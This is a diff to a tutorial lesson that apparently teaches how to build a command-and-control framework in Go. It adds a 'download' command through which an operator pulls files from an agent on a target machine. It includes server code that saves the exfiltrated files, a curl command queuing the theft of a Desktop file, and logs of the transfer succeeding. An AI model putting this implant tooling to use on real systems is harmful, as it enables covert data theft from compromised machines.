@@ -18,14 +18,16 @@ We'll implement a **download command** that:
 1. Operator specifies a file path on the agent's machine
 2. Agent reads that file
 3. Agent sends the file contents back to the server
+4. Server saves the file to a `downloads/` directory
 
 This demonstrates that adding new capabilities follows a predictable pattern:
 
-1. Create argument type
+1. Create argument and result types
 2. Add validator on server (processor only if transformation needed)
 3. Add orchestrator on agent
 4. Add doer on agent
-5. Register the command
+5. Add result handler on server (if special handling needed)
+6. Register the command
 
 Let's see how quickly we can add a complete new command!
 
@@ -35,6 +37,7 @@ Let's see how quickly we can add a complete new command!
 - `DownloadResult` type in `models/results.go`
 - `validateDownloadCommand` in `control/download.go`
 - `orchestrateDownload` in `agent/download.go`
+- `handleDownloadResult` in `server/server_https.go` (to save files to disk)
 - Registry updates for the new command
 
 ## Part 1: Server-Side Types and Processing
@@ -313,6 +316,120 @@ Look how consistent this is with shellcode:
 
 The key insight: **shellcode needs a processor** because the server transforms arguments (reads file, encodes to base64). **Download doesn't** - the file path passes through unchanged. The architecture supports both patterns elegantly.
 
+## Part 3: Server-Side Result Handling
+
+We've built the agent-side logic, but there's one more piece: when the agent sends back the file data, the server needs to **save it to disk**. Currently, `ResultHandler` just logs results - we need to detect download results and handle them specially.
+
+### Update ResultHandler
+
+First, add the required imports to `server/server_https.go`:
+
+```go
+import (
+	// ... existing imports ...
+	"encoding/base64"
+	"os"
+	"path/filepath"
+)
+
+// DownloadDirectory is where downloaded files are saved
+const DownloadDirectory = "./downloads"
+```
+
+Now update the `ResultHandler` function to detect and handle download results:
+
+```go
+// ResultHandler receives and displays the result from the Agent
+func ResultHandler(w http.ResponseWriter, r *http.Request) {
+	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)
+
+	var result models.AgentTaskResult
+
+	// Decode the incoming result
+	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
+		log.Printf("ERROR: Failed to decode JSON: %v", err)
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode("error decoding JSON")
+		return
+	}
+
+	// Try to detect if this is a download result
+	if len(result.CommandResult) > 0 {
+		var downloadResult models.DownloadResult
+		if err := json.Unmarshal(result.CommandResult, &downloadResult); err == nil {
+			// Check if it has file_data - that confirms it's a download result
+			if downloadResult.FileData != "" {
+				handleDownloadResult(result.JobID, &downloadResult)
+				return
+			}
+		}
+	}
+
+	// Not a download result - handle as generic result
+	var messageStr string
+	if len(result.CommandResult) > 0 {
+		if err := json.Unmarshal(result.CommandResult, &messageStr); err != nil {
+			log.Printf("ERROR: Failed to unmarshal CommandResult: %v", err)
+			messageStr = string(result.CommandResult)
+		}
+	}
+
+	if !result.Success {
+		log.Printf("Job (ID: %s) has failed\nMessage: %s\nError: %v", result.JobID, messageStr, result.Error)
+	} else {
+		log.Printf("Job (ID: %s) has succeeded\nMessage: %s", result.JobID, messageStr)
+	}
+}
+```
+
+### Create the Download Handler
+
+Add this function to save downloaded files:
+
+```go
+// handleDownloadResult processes and saves a download result
+func handleDownloadResult(jobID string, downloadResult *models.DownloadResult) {
+	if !downloadResult.Success {
+		log.Printf("Job (ID: %s) DOWNLOAD FAILED: %s", jobID, downloadResult.ErrorMsg)
+		return
+	}
+
+	// Decode the base64 file data
+	fileData, err := base64.StdEncoding.DecodeString(downloadResult.FileData)
+	if err != nil {
+		log.Printf("Job (ID: %s) ERROR: Failed to decode base64 file data: %v", jobID, err)
+		return
+	}
+
+	// Create downloads directory if it doesn't exist
+	if err := os.MkdirAll(DownloadDirectory, 0755); err != nil {
+		log.Printf("Job (ID: %s) ERROR: Failed to create downloads directory: %v", jobID, err)
+		return
+	}
+
+	// Extract just the filename from the path (handles both Windows and Unix paths)
+	filename := filepath.Base(downloadResult.FilePath)
+	// Prefix with job ID to avoid collisions
+	savedFilename := fmt.Sprintf("%s_%s", jobID, filename)
+	savedPath := filepath.Join(DownloadDirectory, savedFilename)
+
+	// Write the file
+	if err := os.WriteFile(savedPath, fileData, 0644); err != nil {
+		log.Printf("Job (ID: %s) ERROR: Failed to save file: %v", jobID, err)
+		return
+	}
+
+	log.Printf("Job (ID: %s) DOWNLOAD SUCCESS: Saved %d bytes to %s (original: %s)",
+		jobID, len(fileData), savedPath, downloadResult.FilePath)
+}
+```
+
+**How it works:**
+
+1. **Detection** - We try to unmarshal the result as `DownloadResult`. If it has a `FileData` field, it's a download.
+2. **Decode** - The file data arrives as base64, so we decode it back to raw bytes.
+3. **Save** - We create a `downloads/` directory (if needed) and save the file with the job ID prefix to avoid name collisions.
+
 ## Test
 
 Let's test the download command!
@@ -336,10 +453,12 @@ curl -X POST http://localhost:8080/command \
   -d '{
     "command": "download",
     "data": {
-      "file_path": "/etc/hostname"
+      "file_path": "C:/Users/tresa/OneDrive/Desktop/test.txt"
     }
   }'
 ```
+
+*This is a file on my target system - replace the path with a file that exists on your agent's machine.*
 
 **Expected client response:**
 
@@ -351,14 +470,21 @@ curl -X POST http://localhost:8080/command \
 
 ```bash
 2025/11/08 14:22:05 Received command: download
-2025/11/08 14:22:05 Download validation passed: file_path=/etc/hostname
+2025/11/08 14:22:05 Download validation passed: file_path=C:/Users/tresa/OneDrive/Desktop/test.txt
 2025/11/08 14:22:05 QUEUED: download
 2025/11/08 14:22:08 Endpoint / has been hit by agent
 2025/11/08 14:22:08 DEQUEUED: Command 'download'
 2025/11/08 14:22:08 Sending command to agent: download
 2025/11/08 14:22:08 Job ID: job_582947
 2025/11/08 14:22:08 Endpoint /results has been hit by agent
-2025/11/08 14:22:08 Job (ID: job_582947) has succeeded
+2025/11/08 14:22:08 Job (ID: job_582947) DOWNLOAD SUCCESS: Saved 42 bytes to downloads/job_582947_test.txt (original: C:/Users/tresa/OneDrive/Desktop/test.txt)
+```
+
+**Verify the download:** Check your `downloads/` directory - you should see the file saved with the job ID prefix:
+
+```bash
+ls -la downloads/
+cat downloads/job_582947_test.txt
 ```
 
 **Expected agent output:**
@@ -368,9 +494,9 @@ curl -X POST http://localhost:8080/command \
 -> Command: download
 -> JobID: job_582947
 2025/11/08 14:22:08 AGENT IS NOW PROCESSING COMMAND download with ID job_582947
-2025/11/08 14:22:08 |DOWNLOAD ORCHESTRATOR| Task ID: job_582947. Downloading file: /etc/hostname
-2025/11/08 14:22:08 |DOWNLOAD DOER| Read 12 bytes from /etc/hostname
-2025/11/08 14:22:08 |DOWNLOAD SUCCESS| Downloaded 12 bytes from /etc/hostname for TaskID job_582947
+2025/11/08 14:22:08 |DOWNLOAD ORCHESTRATOR| Task ID: job_582947. Downloading file: C:/Users/tresa/OneDrive/Desktop/test.txt
+2025/11/08 14:22:08 |DOWNLOAD DOER| Read 42 bytes from C:/Users/tresa/OneDrive/Desktop/test.txt
+2025/11/08 14:22:08 |DOWNLOAD SUCCESS| Downloaded 42 bytes from C:/Users/tresa/OneDrive/Desktop/test.txt for TaskID job_582947
 2025/11/08 14:22:08 |AGENT TASK|-> Sending result for Task ID job_582947 (142 bytes)...
 2025/11/08 14:22:08 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.
 ```
@@ -416,6 +542,7 @@ In this lesson, we demonstrated framework extensibility:
 - Created a single `DownloadArgs` type (no transformation needed)
 - Implemented server-side validation (no processor required)
 - Created the agent-side orchestrator and doer
+- Added server-side result handling to save downloaded files to disk
 - Registered the command in both server and agent
 - Tested the complete flow
 - Understood when to use processors vs. skip them
